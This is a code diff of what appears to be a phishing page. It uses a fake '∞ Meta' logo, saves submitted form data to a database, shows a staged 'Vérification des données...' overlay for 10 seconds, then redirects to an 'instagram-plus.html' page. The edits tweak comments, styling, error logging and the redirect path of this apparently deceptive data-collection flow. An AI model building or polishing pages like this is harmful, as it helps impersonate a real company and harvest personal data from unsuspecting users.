@@ -82,12 +82,12 @@
     }
     .meta-logo { font-weight: bold; color: #0064e0; font-size: 14px; }
     
-    /* شاشة التحقق */
+    /* شاشة التحقق والانتظار 10 ثوانٍ */
     .loading-overlay {
       display: none;
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(255, 255, 255, 0.95);
+      background: rgba(255, 255, 255, 0.98);
       flex-direction: column;
       justify-content: center;
       align-items: center;
@@ -127,7 +127,7 @@
     <div class="meta-logo">∞ Meta</div>
   </div>
 
-  <!-- شاشة الانتظار (10 ثوانٍ) -->
+  <!-- شاشة الانتظار -->
   <div id="loadingOverlay" class="loading-overlay">
     <div class="spinner"></div>
     <div class="loading-text">Vérification des données...</div>
@@ -157,19 +157,22 @@
           .select();
 
         if (error) {
+          console.error('Database Error:', error);
           alert('Erreur: ' + error.message);
           submitBtn.disabled = false;
         } else if (data && data.length > 0) {
           localStorage.setItem('user_row_id', data[0].id);
           
-          // إظهار شاشة التحقق والانتظار 10 ثوانٍ
+          // عرض شاشة الانتظار
           loadingOverlay.style.display = 'flex';
           
+          // التوجيه لصفحة instagram-plus بعد 10 ثوانٍ
           setTimeout(() => {
-            window.location.href = 'instagram-plus.html';
+            window.location.href = './instagram-plus.html';
           }, 10000);
         }
       } catch (err) {
+        console.error('Unexpected Error:', err);
         alert('Erreur inattendue!');
         submitBtn.disabled = false;
       }
